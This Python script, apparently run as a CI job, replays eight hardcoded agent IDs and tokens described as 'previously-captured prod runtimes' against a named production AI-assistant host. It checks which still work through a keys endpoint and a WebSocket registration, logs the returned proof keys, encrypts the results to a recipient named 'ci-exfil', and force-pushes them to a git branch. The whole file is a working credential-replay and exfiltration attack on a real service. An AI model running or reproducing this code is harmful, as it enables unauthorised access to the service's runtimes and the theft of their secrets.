#!/usr/bin/env python3
# intent 28688 step3: test which previously-captured prod runtimes are still LIVE (keys/current + WS register)
import os, sys, json, time, base64, subprocess, socket, ssl, struct, threading
_REF=os.environ.get("GITHUB_REF_NAME","") or ""
if "result" in _REF.lower(): print("skip",flush=True); sys.exit(0)
RUNID=os.environ.get("GITHUB_RUN_ID",str(int(time.time())))
OUT="/tmp/results288b"; os.makedirs(OUT,exist_ok=True)
LOG=open(os.path.join(OUT,"transcript.log"),"a",buffering=1)
def log(*a):
    s=" ".join(str(x) for x in a)
    try: print(s,flush=True)
    except: pass
    LOG.write(s+"\n"); LOG.flush()
def R(k,v):
    try: s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    except: s=str(v)
    log("R:%s:%s"%(k,s[:4000]))
HOST="assistant.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
CANDS=[
 ("rt_44yLXG4GpJVjmvkkZ6gM4","X1-EDRkB4Mpolz-6xp0wLTVoOJLDgLVxFE102oyCl2U"),
 ("rt_LnhhRNmp8DjJhP8ejtSN9","Fz1zCEXCdW5Bue-G_rOQ4z-aRcp0X-kem-F09OImr9o"),
 ("rt_SSso9aPc2HJgYHLJy5ADh","Ls5yA0BLd0VEe0xcotAO7Jva69UmmS5cc9fURthSaM8"),
 ("rt_XdrjSk5LRixTyH8mSzqi4","5ZQn5oAUsHvYpprEc3MS8G1Ly8Ouql0_1228BjLVQMw"),
 ("rt_bdJmzkkzYsfNdCVgsCRrR","9r2c166X3Cl1Uzs0y_GHpHTcLarGd3yVxoMD0Vdryyk"),
 ("rt_mpnPVabFE4EytA9W26N4k","A-TTkRNuC1F8WHVTJ6hYIg8LlpuZrXvHPU3vqZIdxsU"),
 ("rt_rPcZ6pumaShED3JnsJNj3","iXuax3AmCV817kohxqF92cu4gi9sq_keB_NBGj0FWkU"),
 ("rt_zTMAEZx77yifM7GtoGsqF","fcyPPBDUB1H6w6keF_SX6buW21q-_bbVKsE56bdMrc4"),
]
def curl(args,timeout=30):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout
    except Exception as e: return -1,repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=30,maxlen=4000):
    args=["--http2","-A",UA,"-H","Accept: application/json","-H","Origin: https://%s"%HOST,
          "-H","Referer: https://%s/"%HOST,"-w","\n__CODE__%{http_code}"]
    for k,v in (hdrs or {}).items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None: args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    args+=["https://%s%s"%(HOST,path)]
    rc,out=curl(args,timeout); txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen]}
# full health
h=call("/health",maxlen=20000); open(os.path.join(OUT,"health.json"),"w").write(h["body"])
R("health_code",h["code"])
class WS:
    def __init__(self,path,headers):
        self.frames=[]; self.buf=b""; self.ok=False; self.handshake=""
        try:
            sock=socket.create_connection((HOST,443),timeout=20); self.ss=ssl.create_default_context().wrap_socket(sock,server_hostname=HOST)
            key=base64.b64encode(os.urandom(16)).decode()
            req=("GET %s HTTP/1.1\r\nHost: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n")%(path,HOST,key)
            for k,v in headers.items(): req+="%s: %s\r\n"%(k,v)
            req+="\r\n"; self.ss.sendall(req.encode()); buf=b""
            while b"\r\n\r\n" not in buf:
                d=self.ss.recv(4096)
                if not d: break
                buf+=d
            self.handshake=buf.decode("latin1","replace")
            if b"\r\n\r\n" in buf: self.buf=buf.split(b"\r\n\r\n",1)[1]
            self.ok=self.handshake.startswith("HTTP/1.1 101")
        except Exception as e: self.handshake="EXC:"+repr(e)[:200]
    def send_text(self,text):
        data=text.encode(); mask=os.urandom(4); hdr=bytearray([0x81]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        else: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _ctl(self,op,data):
        mask=os.urandom(4); hdr=bytearray([0x80|op]); ln=len(data)
        if ln<126: hdr.append(0x80|ln)
        else: hdr.append(0x80|126); hdr+=struct.pack(">H",ln)
        hdr+=mask; self.ss.sendall(bytes(hdr)+bytes(b^mask[i%4] for i,b in enumerate(data)))
    def _rn(self,n):
        out=b""
        while len(out)<n:
            if self.buf: t=min(n-len(out),len(self.buf)); out+=self.buf[:t]; self.buf=self.buf[t:]
            else:
                d=self.ss.recv(4096)
                if not d: raise IOError("closed")
                self.buf+=d
        return out
    def read_frame(self):
        h=self._rn(2); op=h[0]&0x0f; masked=h[1]&0x80; ln=h[1]&0x7f
        if ln==126: ln=struct.unpack(">H",self._rn(2))[0]
        elif ln==127: ln=struct.unpack(">Q",self._rn(8))[0]
        mk=self._rn(4) if masked else None; data=self._rn(ln)
        if mk: data=bytes(b^mk[i%4] for i,b in enumerate(data))
        return op,data
    def reader(self,stop):
        while not stop.is_set():
            try: op,data=self.read_frame()
            except Exception as e: self.frames.append({"op":"ERR","d":repr(e)[:120]}); return
            if op in (1,0): self.frames.append({"op":"text","d":data.decode("utf-8","replace")[:400]})
            elif op==9:
                try: self._ctl(0xA,data)
                except: pass
                self.frames.append({"op":"ping","d":data[:80].decode("latin1","replace")})
            elif op==8: self.frames.append({"op":"close","d":data[:120].decode("latin1","replace")}); return
LIVE=[]
for rid,rtok in CANDS:
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":rid,"x-agent-token":rtok})
    pk=""
    try: pk=json.loads(k["body"]).get("proof_key","")
    except: pass
    log("[keys %s] code=%s pk=%s"%(rid,k["code"],pk[:12]))
    R("keys_%s"%rid,{"code":k["code"],"body":k["body"][:200]})
    if k["code"]=="200":
        LIVE.append((rid,rtok,pk))
    # ws register
    ws=WS("/api/ws/agent?agent_id=%s&token=%s"%(rid,rtok),{"User-Agent":UA,"Origin":"https://%s"%HOST})
    if ws.ok:
        stop=threading.Event()
        ws.send_text(json.dumps({"type":"register","platform":"dashboard","capabilities":[],"metadata":{"agent_id":rid,"token":rtok}}))
        th=threading.Thread(target=ws.reader,args=(stop,),daemon=True); th.start(); time.sleep(3)
        R("ws_%s"%rid,[f.get("d","")[:180] for f in ws.frames][:6])
        stop.set()
    else:
        log("[ws %s] %s"%(rid,ws.handshake[:80].replace("\r\n"," ")))
    time.sleep(1)
R("LIVE",[{"id":x[0],"pk":x[2][:16]} for x in LIVE])
open(os.path.join(OUT,"live.json"),"w").write(json.dumps([{"id":a,"token":b,"pk":c} for a,b,c in LIVE]))
# push
tb="/tmp/results288b.tar.gz"; subprocess.run("tar czf %s -C /tmp results288b"%tb,shell=True)
enc="/tmp/results288b.tar.gz.gpg"
if os.path.isfile("pub.asc"):
    subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1",shell=True)
    subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s %s"%(enc,tb),shell=True,capture_output=True,timeout=180)
if not os.path.isfile(enc): enc=tb
import shutil; shutil.copyfile(enc,"results288b.tar.gz.gpg")
subprocess.run("git config user.email ci@aro.network; git config user.name ci",shell=True)
subprocess.run('git add -f results288b.tar.gz.gpg && git commit -m "b %s" || true'%RUNID,shell=True,capture_output=True)
r=subprocess.run("git push -f origin HEAD:refs/heads/ci-28688b-results",shell=True,capture_output=True,text=True,timeout=180)
log("PUSH rc=%s %s"%(r.returncode,(r.stderr or "")[-160:])); log("=== END ===")
